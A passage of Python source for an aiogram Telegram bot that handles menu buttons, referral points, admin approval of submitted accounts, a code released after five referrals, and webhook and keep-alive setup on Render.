    if key == 'btn_change_pass':
        await state.set_state(St.wait_email)
        await m.answer(T[l]['change_pass_step1'], reply_markup=cancel_kb(l))
    elif key == 'btn_points':
        await show_points(m, l)
    elif key == 'btn_language':
        await m.answer(T[l]['select_lang'], reply_markup=lang_select_kb())

async def show_points(m: Message, l: str):
    refs = await db.get_referrals(m.from_user.id)
    points = refs * 10
    rank = get_rank(refs, l)
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{m.from_user.id}"
    
    text = T[l]['points_header'].format(points=points, refs=refs, rank=rank, link=link)
    await m.answer(text)

# ================= هندلرهای ادمین =================
@router.callback_query(F.data.startswith("approve_"))
async def cb_approve(c: CallbackQuery):
    acc_id = int(c.data.split('_')[1])
    acc = await db.get_account(acc_id)
    if not acc:
        return
    
    user_id = acc[0]
    l = await db.get_lang(user_id)
    
    await db.approve_account(acc_id)
    
    if PHOTO_FILE_ID:
        try:
            await bot.send_photo(
                user_id,
                PHOTO_FILE_ID,
                caption=T[l]['success_photo_caption'],
                reply_markup=get_code_kb(acc_id)
            )
        except:
            await bot.send_message(
                user_id,
                T[l]['success_photo_caption'],
                reply_markup=get_code_kb(acc_id)
            )
    else:
        await bot.send_message(
            user_id,
            T[l]['success_photo_caption'],
            reply_markup=get_code_kb(acc_id)
        )
    
    await c.message.edit_reply_markup(reply_markup=None)
    await c.answer("✅")

@router.callback_query(F.data.startswith("get_code_"))
async def cb_get_code(c: CallbackQuery):
    acc_id = int(c.data.split('_')[2])
    l = await db.get_lang(c.from_user.id)
    refs = await db.get_referrals(c.from_user.id)
    acc = await db.get_account(acc_id)
    
    if refs >= 5:
        code = acc[5] if acc else "N/A"
        await c.message.answer(T[l]['ref_done'].format(code=code))
    else:
        link = f"https://t.me/{BOT_USERNAME}?start=ref_{c.from_user.id}"
        await c.message.answer(T[l]['need_ref'].format(refs=refs, link=link))
    await c.answer()

# ================= Keep-Alive =================
async def keep_alive():
    await asyncio.sleep(60)
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                await session.get(f"{RENDER_URL}/ping")
                print("Pinged Render to keep alive.")
            except Exception as e:
                print(f"Ping failed: {e}")
            await asyncio.sleep(300)

async def on_startup(app):
    await db.setup()
    await bot.set_webhook(f"{RENDER_URL}/webhook")
    asyncio.create_task(keep_alive())

def main():
    app = web.Application()
    app.router.add_get('/ping', lambda r: web.Response(text='OK'))
    SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path='/webhook')
    setup_application(app, dp, bot=bot)
    app.on_startup.append(on_startup)
    web.run_app(app, host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

if __name__ == "__main__":
    dp = Dispatcher()
    dp.include_router(router)
    bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    main()
